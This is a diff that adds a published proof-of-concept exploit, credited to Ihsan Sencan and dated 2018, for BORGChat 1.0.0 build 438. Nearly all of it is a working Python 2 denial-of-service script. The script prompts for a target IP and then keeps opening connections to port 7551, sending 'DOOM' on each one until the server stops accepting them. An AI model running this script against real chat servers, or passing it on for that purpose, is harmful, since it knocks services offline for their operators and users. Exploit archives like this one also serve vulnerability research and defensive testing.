@@ -1,0 +1,35 @@
+# Exploit Title: BORGChat 1.0.0 build 438 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-10-22
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://borgchat.10n.ro
+# Software Link: http://borgchat.10n.ro/download.php
+# Version: 1.0.0 build 438
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+
+#!/usr/bin/python
+import socket
+print "# # # # # # # #"
+print "BORGChat 1.0.0"
+print "# # # # # # # #"
+print "\r\n"
+Ip = raw_input("[Ip]: ")
+Port = 7551 # Default port
+
+arr=[]
+c=0
+while 1:
+    try:
+        arr.append(socket.create_connection((Ip,Port)))
+        arr[c].send("DOOM")
+        print "Sie!"
+        c+=1
+    except socket.error: 
+        print "++ Done! ++"
+        raw_input()
+        break
